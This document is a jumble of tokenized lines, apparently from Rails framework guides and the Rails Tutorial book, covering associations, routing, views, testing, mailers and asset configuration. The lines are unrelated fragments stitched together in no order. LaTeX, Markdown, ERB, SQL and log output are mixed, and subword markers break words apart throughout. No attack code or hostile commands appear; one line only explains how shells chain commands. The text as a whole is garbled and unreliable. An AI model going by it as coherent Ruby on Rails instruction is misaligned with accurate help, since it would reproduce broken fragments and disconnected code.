▁NOTE : ▁Because ▁the ▁` has _ many ` ▁is ▁defined ▁inside ▁a ▁class ▁that ▁is ▁inside ▁the ╼` Blorgh ` ▁module , ▁Rails ▁will ▁know ▁that ▁you ▁want ▁to ▁use ▁the ▁` Blorgh :: Comment `╼ model ▁for ▁these ▁objects , ▁so ▁there ' s ▁no ▁need ▁to ▁specify ▁that ▁using ▁the ╼` : class _ name ` ▁option ▁here .
▁Rails ▁4▖1 ▁will ▁map ▁` json ` ▁and ▁` h store ` ▁columns ▁to ▁a ▁string - key ed ▁Ruby ▁` Hash ` .
▁<%= ▁image _ tag ▁ attachments [' image ▖ jpg '] ▖ url ▁%>
▁To ▁see ▁all ▁the ▁Rake ▁task s ▁available , ▁run
▁The ▁\ emph { re as on } ▁I ▁ ch o se ▁to ▁break ▁the ▁code ▁into ▁pieces ▁is ▁that ▁I ▁prefer ▁to ▁keep ▁lines ▁of ▁source ▁code ▁under ▁ 80 ▁characters ▁for ▁ le g i b i l ity
▁POST ▁ / users (▖ : format ) ▁users # create
▁Because ▁we ▁also ▁included ▁the ▁attribute ▁(\ k ode { remember \_ digest }) ▁and ▁type ▁(\ k ode { string }), ▁Rails ▁generates ▁a ▁default ▁migration ▁for ▁us , ▁as ▁show n ▁in ▁Listing ~\ ref { code : add _ remember _ digest _ to _ users _ generated } .
▁If ▁you ▁get ▁ st u c k , ▁don ' t ▁he s it ate ▁to ▁skip ▁it ; ▁as ▁noted ▁previous ly , ▁the ▁sample ▁application ▁ developed ▁in ▁this ▁tutorial ▁is ▁fully ▁ com p at ible ▁with ▁both ▁SQLite ▁and ▁PostgreSQL .
▁The ▁\ k ode { create !} \ ▁method ▁is ▁just ▁like ▁the ▁\ k ode { create } ▁method , ▁except ▁it ▁raise s ▁an ▁exception ▁( Section ~\ ref { sec : find ing _ user _ objects }) ▁for ▁an ▁invalid ▁user ▁rather ▁than ▁return ing ▁\ k ode { false } .
▁ assoc ▖ has _ many ▁: customers
▁You ▁can ▁see ▁how ▁a ▁case ▁could ▁be ▁made ▁for ▁either ▁Cucumber ▁or ▁integration ▁tests .
▁As ▁we ' ll ▁see ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁it ' s ▁often ▁convenient ▁to ▁make ▁and ▁save ▁a ▁model ▁in ▁two ▁steps ▁as ▁we ▁have ▁above , ▁but ▁Active ▁Record ▁also ▁let s ▁you ▁combine ▁them ▁into ▁one ▁step ▁with ▁\ k ode { User ▖ create } :
▁The ▁above ▁are ▁ guidelines ▁- ▁please ▁use ▁your ▁best ▁ j u d g ment ▁in ▁using ▁them .
▁unless : ▁ Proc ▖ new ▁ { ▁| c | ▁c ▖ track p ad ▖ present ?
▁This ▁is ▁because ▁in ▁most ▁ s hell s , ▁you ▁can ▁execute ▁another ▁command ▁at ▁the ▁end ▁of ▁the ▁first ▁one , ▁ concat en ating ▁them ▁with ▁a ▁ s em ic ol on ▁( ; ) ▁or ▁a ▁vertical ▁bar ▁( | ) .
▁#### ▁ New ▁JSON ▁ en code r
▁The ▁\ href { http :// gravatar ▖ com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// www ▖ michael hartl ▖ com /}{ some ▁ dude } .
▁Format s ▁a ▁number ▁with ▁group ed ▁t housand s ▁using ▁a ▁ delimiter .
▁But , ▁as ▁noted ▁in ▁Section ~\ ref { sec : a _ problem _ with _ the _ data _ model }, ▁\ k ode { user ▖ followed s } ▁is ▁rather ▁a w k ward , ▁so ▁we ' ll ▁write ▁\ k ode { user ▖ following } ▁instead .
▁render ▁template : ▁" books / edit ▖ html ▖ erb "
▁Let ' s ▁consider ▁each ▁in ▁turn .
▁=> ▁" foo "
▁To ▁make ▁these ▁collection s , ▁it ' s ▁worth ▁know ing ▁about ▁the ▁useful ▁\ k ode { \ % w [ ]} ▁technique ▁for ▁making ▁arrays ▁of ▁strings , ▁as ▁seen ▁in ▁this ▁console ▁session :
▁* ▁FROM ▁clients ▁ LE F T ▁ OUT ER ▁JOIN ▁addresses ▁ ON ▁addresses ▖ client _ id ▁= ▁clients ▖ id
▁<%= ▁link _ to ▁' P at i ent ▁Record ', ▁ patient _ path (@ patient ) ▁%>
▁< a ▁ href =" ▖▖▖" ▁data - no - t ur bo link > N o ▁ turbolinks ▁here </ a > .
▁A ▁direct ▁test ▁the ▁\ k ode { full \_ title } ▁helper .
▁In ▁future ▁chapter s , ▁the ▁branch es ▁and ▁commit ▁messages ▁will ▁differ , ▁of ▁course , ▁but ▁the ▁basic ▁idea ▁is ▁the ▁same .
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ user _ index _ two _ rails _ 3- full ▖ png }{( full ▁size )}
▁T ips , ▁T r ic k s , ▁and ▁ W ar n ing s
▁validates ▁: m ous e , ▁presence : ▁true ,
▁( This ▁is ▁the ▁security ▁hole ▁all u d ed ▁to ▁above ▖)
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails ▖ env ▖ test ?} ▁returns ▁\ text tt { true } ▁in ▁a ▁test ▁environment ▁and ▁\ text tt { false } ▁otherwise .
▁ Array ▖ wrap (0) ▁# ▁=> ▁[ 0 ]
▁As sum ing ▁`@ products ` ▁is ▁a ▁collection ▁of ▁` product ` ▁instance s , ▁you ▁can ▁simply ▁write ▁this ▁in ▁the ▁` index ▖ html ▖ erb ` ▁to ▁produce ▁the ▁same ▁result :
▁If ▁this ▁test ▁feel s ▁a ▁little ▁abstract , ▁go ▁a head ▁and ▁fire ▁up ▁the ▁console :
▁$ ▁bundle ▁exec ▁rails ▁new ▁~/ my - test - app ▁-- dev
▁Convert ing ▁these ▁requirements ▁to ▁assertions ▁and ▁recall ing ▁that ▁the ▁\ k ode { feed } ▁is ▁in ▁the ▁User ▁model ▁( Listing ~\ ref { code : proto _ status _ feed }) ▁gives ▁the ▁updated ▁User ▁model ▁test ▁show n ▁in ▁Listing ~\ ref { code : full _ feed _ test } .
▁* ▁How ▁to ▁declare ▁associations ▁between ▁Active ▁Record ▁models .
▁* ▁`: delete `, ▁when ▁the ▁object ▁is ▁destroyed , ▁all ▁its ▁ associated ▁objects ▁will ▁be ╼ delete d ▁directly ▁from ▁the ▁database ▁without ▁calling ▁their ▁` destroy ` ▁method .
▁#### ▁Rendering ▁No th ing
▁Rails ▁will ▁automatically ▁generate ▁a ▁response ▁with ▁the ▁correct ▁HTTP ▁status ▁code ▁( in ▁most ▁cases , ▁this ▁is ▁` 200 ▁OK ` )▖
▁The ▁default ▁\ k ode { Gemfile } ▁open ▁in ▁a ▁text ▁editor .
▁class ▁User
▁ Compar ing ▁Listing ~\ ref { code : demo _ users _ controller _ class } ▁and ▁Listing ~\ ref { code : demo _ microposts _ controller _ class }, ▁we ▁see ▁that ▁both ▁the ▁Users ▁controller ▁and ▁the ▁Microposts ▁controller ▁inherit ▁from ▁the ▁Application ▁controller .
▁( You ' ve ▁ probably ▁visit ed ▁website s ▁where ▁`` small '' ▁images ▁seem ing ly ▁take ▁for ever ▁to ▁load .
▁Like ▁an ▁` image _ tag ` ▁you ▁can ▁supply ▁a ▁path , ▁either ▁ absolute , ▁or ▁relative ▁to ▁the ▁` public / video s ` ▁directory ▖
▁There ▁are ▁a ▁couple ▁of ▁new ▁configuration ▁settings ▁that ▁you ▁should ▁add ▁to ▁your ▁development ▁environment :
▁For ▁example , ▁consider ▁a ▁hash ▁named ▁\ k ode { flash } ▁with ▁keys ▁for ▁two ▁conditions , ▁\ k ode { : success } ▁and ▁\ k ode { : error } :
▁has _ one ▁: account , ▁class _ name : ▁" Billing "
▁( For ▁technical ▁reason s , ▁the ▁only ▁exception ▁to ▁this ▁is ▁the ▁\ k ode { rails } ▁command ▁itself ▖)
▁$("# re s ul t s ")▖ append ▁ html
▁Testing ▁an ▁engine
▁ Migration ▁filename s ▁include ▁a ▁timestamp ▁to ╼ en sure ▁that ▁they ' re ▁processed ▁in ▁the ▁order ▁that ▁they ▁were ▁created .
▁A mong ▁other ▁things , ▁file ▁ storage ▁on ▁Heroku ▁is ▁temporary , ▁so ▁upload ed ▁images ▁will ▁be ▁delete d ▁every ▁time ▁you ▁deploy .
▁This ▁is ▁exactly ▁the ▁same ▁as ▁defin ing ▁a ▁class ▁method , ▁and ▁which ▁you ▁use ▁is ▁a ▁matter ▁of ▁person al ▁prefer ence :
▁* ▁` update `
▁This ▁means ▁that ▁there ' s ▁only ▁one ▁constraint ▁left : ▁enforc ing ▁the ▁email ▁addresses ▁to ▁be ▁unique .
▁ Adding ▁a ▁resource ▁for ▁account ▁ activations .
▁This ▁should ▁fail ▁because ▁by ▁default ▁the ▁posts ▁will ▁be ▁order ed ▁by ~ id , ▁i ▖ e ▖ , ▁\ k ode { [ ol d er \_ micropost , ▁new er \_ micropost ]} .
▁In ▁this ▁case , ▁a ▁non - signed - in ▁user ▁is ▁ redirected ▁upon ▁ submitting ▁a ▁\ text tt { POST } ▁request ▁to ▁ / microposts ▁(\ k ode { post ▁microposts \_ path }, ▁which ▁hit s ▁the ▁\ k ode { create } ▁action ) ▁or ▁ submitting ▁a ▁\ text tt { DELETE } ▁request ▁to ▁ / microposts /1 ▁(\ k ode { delete ▁micropost \_ path ( micropost ) }, ▁which ▁hit s ▁the ▁\ k ode { destroy } ▁action ) .
▁In ▁the ▁next ▁chapter , ▁Chapter ~\ ref { cha : sign _ up }, ▁we ' ll ▁make ▁a ▁working ▁signup ▁form ▁to ▁create ▁new ▁users , ▁together ▁with ▁a ▁page ▁to ▁display ▁each ▁user ' s ▁information .
▁The ▁\ k ode { heroku } ▁command ▁creates ▁a ▁new ▁ subdomain ▁just ▁for ▁our ▁application , ▁available ▁for ▁ im media te ▁view ing .
▁You ▁can ▁verify ▁that ▁you ▁have ▁a ▁ sufficient ly ▁up - to - date ▁version ▁of ▁ RVM ▁as ▁follows :
▁We ▁will ▁see ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▁that ▁initializ ing ▁objects ▁using ▁a ▁hash ▁argument , ▁a ▁technique ▁known ▁as ▁\ emph { mass ▁assignment }, ▁is ▁common ▁in ▁Rails ▁applications .
▁is ▁\ k ode { ' 1 ' } ▁if ▁the ▁ box ▁is ▁check ed ▁and ▁\ k ode { ' 0 ' } ▁if ▁it ▁isn ' t .
▁ Partial s ▁are ▁very ▁useful ▁in ▁rendering ▁collection s ▖
▁options ▁= ▁options ▖ reverse _ merge ( length : ▁30 , ▁omission : ▁" ▖▖▖" )
▁A mong ▁other ▁things , ▁the ▁technique s ▁here ▁may ▁be ▁more ▁up - to - date ▁than ▁the ▁one s ▁you ▁ pick ed ▁up ▁when ▁you ▁original ly ▁ learned ▁Rails .
▁If ▁you ' re ▁using ▁Git , ▁now ▁would ▁be ▁a ▁good ▁time ▁to ▁commit ▁if ▁you ▁have n ' t ▁done ▁so ▁in ▁a ▁while :
▁By ▁construction , ▁the ▁Users ▁controller ▁already ▁has ▁a ▁\ k ode { new } ▁action , ▁so ▁to ▁get ▁the ▁test ▁to ▁pass ▁all ▁we ▁need ▁is ▁the ▁right ▁route ▁and ▁the ▁right ▁view ▁content .
▁See ▁the ▁discussion ▁on ▁\ href { http :// stack overflow ▖ com / questions / 53 59 5 58 / when - to - use - rspec - let } { when ▁to ▁use ▁let ▁at ▁ Stack ▁Overflow } ▁for ▁more ▁information .
▁This ▁will ▁also ▁create ▁routing ▁helpers ▁such ▁as ▁` magazine _ ads _ url ` ▁and ▁` edit _ magazine _ ad _ path ` ▖
▁The ▁asset ▁pipeline ▁is ▁technical ly ▁no ▁longer ▁a ▁ core ▁feature ▁of ▁Rails ▁4 , ▁it ▁has ╼ be en ▁ extract ed ▁out ▁of ▁the ▁framework ▁into ▁the ╼[ sprockets - rails ]( https :// github ▖ com / rails / sprockets - rails ) ▁gem .
▁create _ table ▁: part s ▁do ▁| t |
▁If ▁the ▁module ▁is ▁ anonymous ▁or ▁belongs ▁to ▁the ▁to p - level , ▁` parent ` ▁returns ▁` Object ` .
▁With ▁the ▁user ▁view ▁and ▁action ▁defined , ▁the ▁URL ▁\ href { http ://0▖0▖0▖0:3000/ users /1}{/ users /1 } ▁works ▁ perfect ly , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : user _ show _ rails } .
▁in ▁Listing ~\ ref { code : user _ factory } .
▁The ▁corresponding ▁application ▁code ▁is ▁virtual ly ▁identical ▁to ▁the ▁\ k ode { name } ▁validation ▁for ▁users ▁( Listing ~\ ref { code : length _ validation }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations } .
▁Note ▁that ▁we ▁also ▁add ▁\ k ode { : destroy } ▁to ▁the ▁\ k ode { signed \_ in \_ user } ▁before ▁filter .
▁class ▁ Account H is to ry ▁< ▁ActiveRecord :: Base
▁* ▁` select `
▁| ▁` Rails :: Rack :: Debugger ` ▁| ▁Start s ▁ Debugger ▁|
▁No ▁route ▁matches ▁[ GET ] ▁"/ static _ pages / about "
▁The ▁tests ▁themselves ▁rely ▁on ▁the ▁\ emph { boolean ▁convention } ▁used ▁by ▁RSpec : ▁the ▁code
▁Verify ▁that ▁the ▁new ▁sessions ▁form ▁get s ▁re - render ed ▁and ▁that ▁a ▁flash ▁message ▁appears .
▁<%= ▁link _ to ▁' Magazine ▁details ', ▁@ magazine ▁%>
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products , ▁layout : ▁" special _ layout " ▁%>
▁S ent ▁mail ▁to ▁ michael @ michael hartl ▖ com ▁( 9 3 1 ▖ 6 m s )╼ Date : ▁We d , ▁0 3 ▁Sep ▁2014 ▁ 19 : 4 7 : 18 ▁+0000 ╼ From : ▁no reply @ example ▖ com ╼ To : ▁ michael @ michael hartl ▖ com ╼ Message - ID : ▁< 5407704 7 4 e 16 _ 6 1 d 3 fd 19 14 f 4 cd 0 3 00 a 0 @ mhartl - rails - tutorial - 9 5 37 53 ▖ mail >╼ S ub j ec t : ▁ Account ▁activation ╼ M i me - Version : ▁1▖ 0 ╼ Content - Type : ▁ multipart / alternative ; ╼ ▁b ound ary =" - - == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a " ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼ ╼╼ - --- == _ mime part _ 5407704 656 b 50 _ 6 1 d 3 fd 19 14 f 4 cd 02 99 6 a ╼ Content - Type : ▁text / plain ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ H i ▁ Michael ▁Hartl , ╼╼ Welcome ▁to ▁the ▁ Sample ▁App !
▁If ▁the ▁default ▁name ▁of ▁the ▁join ▁table , ▁base d ▁on ▁ le x ical ▁ ordering , ▁is ▁not ▁what ▁you ▁want , ▁you ▁can ▁use ▁the ▁`: join _ table ` ▁option ▁to ▁override ▁the ▁default .
▁You ▁can ▁pass ▁in ▁the ▁filename ▁( ` ▖ js ` ▁extension ▁is ▁optional ) ▁of ▁JavaScript ▁files ▁that ▁exist ▁in ▁your ▁` app / assets / javascripts ` ▁directory ▁for ▁inclusion ▁into ▁the ▁current ▁page ▁or ▁you ▁can ▁pass ▁the ▁full ▁path ▁relative ▁to ▁your ▁document ▁root .
▁When ▁assets ▁are ▁deploy ed ▁to ▁a ▁ clu s ter , ▁there ▁is ▁no ▁guarantee ▁that ▁the ╼ timestamp s ▁will ▁be ▁the ▁same , ▁result ing ▁in ▁different ▁values ▁being ▁used ▁depending ╼ on ▁which ▁server ▁handle s ▁the ▁request .
▁When ▁I ▁original ly ▁implemented ▁the ▁checkbox ▁handling ▁in ▁Listing ~\ ref { code : remember _ me _ ternary }, ▁instead ▁of ▁the ▁correct
▁To ▁set ▁your ╼ asset ▁host ▁in ▁Rails , ▁you ▁need ▁to ▁set ▁` config ▖ action _ controller ▖ asset _ host ` ▁in ╼` config / production ▖ rb `:
▁Note ▁here ▁the ▁special ▁line
▁* ▁Your ▁database : ▁Rails ▁defaults ▁to ▁convert ing ▁data ▁from ▁your ▁database ▁into ▁ UT F -8 ╼ ▁at ▁the ▁b ound ary ▖
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http ://0▖0▖0▖0:3000/ users }{/ users }) .
▁For ▁example , ▁you ▁cannot ▁do ▁` Client ▖ where ( status : ▁: active ) ` .
▁<%= ▁f ▖ text _ area ▁: body ▁%>
▁This ▁creates ▁a ▁user ▁with ▁a ▁different ▁email ▁address ▁from ▁the ▁default .
▁def ▁valid ?(
▁Defaults ▁to ▁` - i ▁- t ` .
▁This ▁repeated ▁code ▁is ▁a ▁violat ion ▁of ▁the ▁important ▁`` Don ' t ▁R epeat ▁Your self '' ▁( DRY ) ▁principle ; ▁in ▁this ▁section ▁and ▁the ▁next ▁we ' ll ▁`` DRY ▁out ▁our ▁code '' ▁by ▁remov ing ▁the ▁repetition .
▁Note ▁in ▁particular ▁that ▁fixtures ▁support ▁ embedded ▁Ruby , ▁which ▁allows ▁us ▁to ▁use
▁| ▁| ▁4 17 ▁| ▁: expect ation _ failed ▁|
▁ Specific ally ▁perform s ▁these ▁ transform ation s :
▁To ▁es tab li sh ▁the ▁route ▁m app ing ▁for ▁the ▁Home ▁page , ▁we ▁\ emph { co ul d } ▁use ▁code ▁like ▁this :
▁For t un ate ly , ▁\ k ode { : uniqueness } ▁accept s ▁an ▁option , ▁\ k ode { : case \_ sensitive }, ▁for ▁just ▁this ▁purpose ▁( Listing ~\ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive }) .
▁in ▁Listing ~\ ref { code : login _ upon _ signup } ▁and
▁| ▁| ▁30 8 ▁| ▁: permanent _ redirect ▁|
▁Because ▁the ▁\ text tt { will \_ paginate } ▁gem ▁is ▁in ▁ wide ▁use , ▁there ' s ▁no ▁need ▁to ▁test ▁it ▁ th or ough ly , ▁so ▁we ' ll ▁take ▁a ▁light we ight ▁approach .
▁* ▁Rails ▁4▖0 ▁has ▁removed ▁` attr _ accessible ` ▁and ▁` attr _ protected ` ▁feature ▁in ▁favor ▁of ▁S trong ▁Parameters ▖
▁Active ▁Record ▁ Query ▁Interface
▁Generat ing ▁a ▁new ▁sample ▁app .
▁We ▁could ▁now ▁define ▁the ▁\ k ode { current \_ user } ▁method ▁as ▁follows :
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling .
▁In ▁other ▁words , ▁a ▁user ▁start s ▁on ▁a ▁profile ▁page , ▁follows ▁the ▁user , ▁and ▁is ▁immediately ▁ redirected ▁back ▁to ▁the ▁original ▁page .
▁create ▁app
▁The ▁first ▁ critical ▁step ▁is ▁to ▁create ▁a ▁\ emph { data ▁model } ▁for ▁users ▁of ▁our ▁site , ▁together ▁with ▁a ▁way ▁to ▁store ▁that ▁data .
▁You ▁can ▁configure ▁default ▁headers ▁in ▁` config / application ▖ rb ` .
▁ Adding ▁code ▁to ▁test ▁the ▁contents ▁of ▁the ▁Help ▁page .
▁Application ▁configuration
▁The ▁updated ▁\ k ode { Gemfile } ▁appears ▁in ▁Listing ~\ ref { code : will _ paginate _ gem } .
▁class ▁My Mailer ▁< ▁ ActionMailer :: Base
▁The ▁tests ▁look ▁good ▁too .
▁c attr _ accessor ▁: first _ name , ▁instance _ reader : ▁false
▁=> ▁#< User ▁id : ▁1, ▁name : ▁" Michael ▁Hartl ", ▁email : ▁" mhartl @ example ▖ com ",
▁( Note ▁the ▁addition ▁of ▁the ▁magic ▁columns , ▁which ▁were n ' t ▁present ▁in ▁the ▁ sketch ▁show n ▁in ▁Figure ~\ ref { fig : user _ model _ sketch } ▖)
▁# ▁return ▁the ▁first ▁user
▁When ▁rendering ▁collection s ▁it ▁is ▁also ▁possible ▁to ▁use ▁the ▁`: layout ` ▁option :
▁As ▁a ▁final ▁step , ▁let ' s ▁update ▁our ▁ seed ▁data ▁to ▁make ▁the ▁first ▁user ▁an ▁admin ▁by ▁default ▁( Listing ~\ ref { code : po p ul at or _ with _ admin }) .
▁In ▁this ▁application :
▁B eginning ▁data ▁ modeling
▁In ▁the ▁present ▁case , ▁that ▁point ▁is ▁before ▁the ▁object ▁is ▁saved , ▁so ▁we ' ll ▁use ▁a ▁\ k ode { before \_ save } ▁callback ▁to ▁ downcase ▁the ▁email ▁attribute ▁before ▁saving ▁the ▁user
▁Note ▁the ▁use ▁of ▁ strong ▁parameters ▁via ▁\ k ode { micropost \_ params }, ▁which ▁ permit s ▁only ▁the ▁micropost ' s ▁\ k ode { content } ▁attribute ▁to ▁be ▁ modified ▁through ▁the ▁web .
▁class ▁ Invoice ▁< ▁ActiveRecord :: Base
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ demo _ app } ▁to ▁generate ▁scaffold ing .
▁T a k ing ▁into ▁account ▁that ▁any ▁object ▁other ▁than ▁\ k ode { nil } ▁and ▁\ k ode { false } ▁itself ▁is ▁\ k ode { true } ▁in ▁a ▁boolean ▁context ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁the ▁possibilities ▁appear ▁as ▁in ▁Table ~\ ref { table : user _ and _ and } .
▁If ▁you ▁choose ▁to ▁use ▁ MySQL ▁instead ▁of ▁the ▁ ship ped ▁SQLite 3 ▁database , ▁your ▁` config / database ▖ yml ` ▁will ▁look ▁a ▁little ▁different ▖
▁@ supplier ▖ account ▁= ▁@ account
▁The ▁method ▁` extract !` ▁returns ▁the ▁same ▁sub class ▁of ▁ Hash , ▁that ▁the ▁receiver ▁is .
▁In ▁JavaScript ▁files , ▁Sprockets ▁ directive s ▁ begin ▁with ▁` //= ` ▖
▁" Help "
▁* ▁How ▁to ▁write ▁effective ▁pro se ▁for ▁documentation ▁purposes .
▁A ▁named ▁module ▁is ▁ reachable ▁if ▁it ▁is ▁store d ▁in ▁its ▁corresponding ▁constant ▖
▁The ▁new ▁signup ▁page ▁at ▁\ href { http ://0▖0▖0▖0:3000/ signup }{/ signup } .
▁in ▁Listing ~\ ref { code : installing _ rails } .
▁# ▁=> ▁email s ▁to ▁me @ email ▖ com .
▁Create ▁a ▁new ▁initializer ▁at ▁` config / initializers / blorgh ▖ rb ` ▁inside ▁the ╼ application ▁where ▁the ▁` blorgh ` ▁engine ▁is ▁installed ▁and ▁put ▁this ▁content ▁in ▁it :
▁In ▁the ▁feature , ▁\ k ode { Given } ▁is ▁just ▁a ▁string , ▁but ▁in ▁the ▁step ▁file ▁\ k ode { Given } ▁is ▁a ▁\ emph { method } ▁that ▁take s ▁a ▁regular ▁expression ▁and ▁a ▁block .
▁user 	 0 m 7▖2 4 0 s
▁Sun , ▁ 15 ▁A ug ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁as : ▁: item , ▁local s : ▁ { title : ▁" Product s ▁P age "} ▁%>
▁* ▁Name space ▁is ol ation ▁to ▁` config / routes ▖ rb `:
▁A ▁partial ▁for ▁a ▁single ▁feed ▁item .
▁# ▁email ▁: string ( 2 55 )
▁When ▁it ▁can ' t ▁find ▁it , ▁it ▁will ▁throw ╼ this ▁error ▖
▁Fin ally , ▁by ▁including ▁Git , ▁GitHub , ▁and ▁Heroku ▁in ▁the ▁ demo ▁examples , ▁the ▁author ▁really ▁gives ▁you ▁a ▁feel ▁for ▁what ▁it ' s ▁like ▁to ▁do ▁a ▁real - world ▁project .
▁S h or t ▁ docs ▁do ▁not ▁need ▁an ▁explicit ▁" Example s " ▁ label ▁to ▁introduce ▁ s n ip pe t s ; ▁they ▁just ▁follow ▁pa ra gr a ph s :
▁As ▁before , ▁if ▁there ▁was ▁an ▁error ▁updating ▁the ╼ article ▁we ▁want ▁to ▁show ▁the ▁form ▁back ▁to ▁the ▁user .
▁def ▁ initialize ( x , ▁ y )
▁Now ▁that ▁our ▁sample ▁users ▁have ▁both ▁followed ▁user ▁and ▁followers ▁arrays , ▁we ▁need ▁to ▁update ▁the ▁profile ▁page ▁and ▁Home ▁page ▁to ▁reflect ▁this .
▁P o ly m or ph ic ▁Association ▁D iagram ]( images / polymorphic ▖ png )
▁( Re call ▁from ▁Listing ~\ ref { code : user _ login _ test _ valid _ information } ▁that ▁\ k ode { users (: michael )} ▁ references ▁the ▁fixture ▁user ▁from ▁Listing ~\ ref { code : real _ user _ fixture } ▖)
▁In ▁the ▁case ▁of ▁the ▁ shim ▁partial , ▁this ▁is ▁just ▁the ▁three ▁lines ▁of ▁ shim ▁code ▁from ▁Listing ~\ ref { code : layout _ new _ structure } .
▁because ▁the ▁reset ▁link ▁ puts ▁the ▁email ▁in ▁\ k ode { params [: email ]} , ▁whereas ▁the ▁latter ▁would ▁put ▁it ▁in ▁\ k ode { params [: user ] [: email ]} .
▁( The ▁reason ▁for ▁the ▁order ▁of ▁the ▁ lo o p s ▁in ▁Listing ~\ ref { code : sample _ microposts } ▁is ▁to ▁in term i x ▁the ▁microposts ▁for ▁use ▁in ▁the ▁status ▁feed ▁( Section ~\ ref { sec : the _ status _ feed }) .
▁ Hello ▁World "
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁passing , ▁and ▁the ▁Users ▁resource --- with ▁its ▁controller , ▁model , ▁and ▁views --- is ▁function ally ▁complete .
▁The ▁[ Rails ▁security ▁p ol ic y ▁page ]( http :// rubyonrails ▖ org / security ) ▁details ▁the ▁ procedure ▁to ▁follow ▁for ▁security ▁issues .
▁#### ▁S a fe ▁ String s
▁from ▁Listing ~\ ref { code : gitignore } ▁to
▁As ▁with ▁the ▁rule ▁for ▁the ▁root ▁route , ▁this ▁creates ▁two ▁named ▁routes , ▁\ k ode { help \_ path } ▁and ▁\ k ode { help \_ url } :
▁Note ▁that ▁the ▁CSS ▁in ▁Listing ~\ ref { code : universal _ css } ▁has ▁a ▁consistent ▁form .
▁$ ▁R U B Y O P T = - W 0 ▁bundle ▁exec ▁rake ▁test
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ do ub le _ logout } .
▁* ▁Pass ▁the ▁file ▁name ▁and ▁specify ▁headers ▁and ▁content ▁and ▁Action ▁Mailer ▁and ▁ Mail ╼ ▁will ▁use ▁the ▁settings ▁you ▁pass ▁in .
▁match ▁' / ' ▁=> ▁' root # index ', ▁via : ▁: get
▁There ' s ▁also ▁a ▁special ▁redirect ▁that ▁send s ▁the ▁user ▁back ▁to ▁the ▁page ▁they ▁just ▁c a me ▁from :
▁Rails ▁offer s ▁three ▁[ built - in ▁assertions ]( http :// api ▖ rubyonrails ▖ org / classes / ActionDispatch / Assertion s / Routing Assertion s ▖ html ) ▁design ed ▁to ▁make ▁testing ▁routes ▁simple r :
▁A lthough ▁we ' ve ▁brief ly ▁examine d ▁the ▁HTML ▁for ▁the ▁form ▁in ▁Figure ~\ ref { fig : signup _ form } ▁( show n ▁in ▁Listing ~\ ref { code : signup _ form _ html }), ▁we ▁have n ' t ▁yet ▁covered ▁any ▁details , ▁and ▁the ▁form ▁is ▁best ▁under st ood ▁in ▁the ▁context ▁of ▁\ emph { signup ▁failure } .
▁Listing ~\ ref { code : layout _ links _ test } ▁shows ▁how ▁we ▁can ▁use ▁Rails ▁integration ▁tests ▁to ▁ tr an s l ate ▁these ▁steps ▁into ▁code , ▁beginning ▁with ▁the ▁\ k ode { assert \_ template } ▁method ▁to ▁verify ▁that ▁the ▁Home ▁page ▁is ▁rendered ▁using ▁the ▁correct ▁view
▁In ▁those ▁cases , ▁you ▁may ▁give ▁an ▁options ▁hash ▁a ▁distinguish ed ▁treat ment ▁with ▁` extract _ options !
▁in ▁Listing ~\ ref { code : show _ only _ active _ users _ exercise } .
▁### ▁Using ▁a ▁ String ▁SQL ▁F ra g ment
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁ASC ▁LIMIT ▁1
▁** The ▁file ▁name ▁can ▁change ▁between ▁ n ode s ▁in ▁ multi - server ▁ environments .
▁In ▁order ▁to ▁complete ▁the ▁styling , ▁we ▁need ▁just ▁a ▁few ▁more ▁CSS ▁rules , ▁as ▁show n ▁in ▁Listing ~\ ref { code : remember _ me _ css } .
▁Use ▁` rake ▁secret ` ▁to ▁generate ▁new ▁keys ▁for ▁the ▁` development ` ▁and ▁` test ` ▁section s .
▁Date ▖ new (201 0, ▁4 , ▁30 )▖ months _ since (2) ▁# ▁=> ▁We d , ▁30 ▁Jun ▁2010
▁ EXPLAIN ▁for : ▁ SELECT ▁` users ` .
▁An ▁example ▁of ▁this ▁is ▁` ActiveRecord :: Core :: Class Methods # a rel _ table `:
▁has _ many ▁: to do s , ▁primary _ key : ▁: guid
▁For ▁some ╼ back end s ▁you ▁need ▁to ▁specify ▁the ▁ queue s ▁to ▁list en ▁to .
▁page ▁to ▁list ▁all ▁users
▁rest ▁= ▁hash ▖ extract !( : a )▖ class
▁c attr _ accessor (: emulate _ boolean s ) ▁ { ▁true ▁ }
▁ Module ▖ new ▖ anonymous ?
▁ } }╼\ end { figure }╼╼ ▁% ▁subsection ▁header ▁( end )╼╼ ▁\ subsection { Bootstrap ▁and ▁custom ▁CSS } ▁% ▁( fold )╼ ▁\ label { sec : custom _ css }╼╼
▁The ▁` group ` ▁method ▁ s up p li es ▁an ▁attribute ▁name ▁to ▁group ▁the ▁result ▁set ▁by , ▁using ▁a ▁` G R O U P ▁BY ` ▁clause ▁in ▁the ▁find er ▁SQL .
